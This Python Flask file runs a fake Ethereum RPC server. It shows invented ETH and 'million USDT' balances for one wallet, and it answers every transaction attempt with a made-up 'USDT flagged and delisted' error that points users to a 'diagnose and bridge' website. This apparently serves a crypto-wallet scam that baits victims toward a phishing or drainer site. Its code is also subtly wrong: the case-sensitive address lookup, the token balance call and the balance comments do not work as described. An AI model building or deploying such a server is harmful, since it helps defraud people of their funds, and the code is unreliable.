from flask import Flask, request, jsonify

app = Flask(__name__)

# Example wallet address and balances
wallet_balances = {
    "0x2500fa4b7214E0F1EB536bbF0b17865fd25d31D1": {
        "eth": "0x8ac7230489e80000",   # 10 ETH in wei (for example)
        "usdt": "0xde0b6b3a76400000"  # 1 million USDT in smallest unit
    }
}

@app.route("/", methods=["POST"])
def rpc():
    data = request.get_json()
    method = data.get("method")
    req_id = data.get("id")
    params = data.get("params")

    # Always return chain id 1337 (0x539)
    if method == "eth_chainId":
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0x539"})

    # Return ETH balance for the requested address
    if method == "eth_getBalance":
        address = params[0].lower()
        balance = wallet_balances.get(address, {}).get("eth", "0x0")
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": balance})

    # Simulate eth_call for USDT balanceOf method
    if method == "eth_call":
        call_data = params[0].get("data", "")
        if call_data.startswith("0x70a08231"):  # balanceOf method
            address = params[0].get("to", "").lower()
            # For demo, return USDT balance of first wallet or 0
            usdt_balance = wallet_balances.get(address, {}).get("usdt", "0x0")
            return jsonify({"jsonrpc": "2.0", "id": req_id, "result": usdt_balance})
        return jsonify({"jsonrpc": "2.0", "id": req_id, "result": "0x0"})

    # Simulate error on sending transactions
    if method == "eth_sendRawTransaction":
        return jsonify({
            "jsonrpc": "2.0",
            "id": req_id,
            "error": {
                "code": -32000,
                "message": "USDT Flagged and Delisted in the EU and Parts of the USA, Diagnose and bridge here (www.xxxxxxxx.)"
            }
        })

    # Default null result
    return jsonify({"jsonrpc": "2.0", "id": req_id, "result": None})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
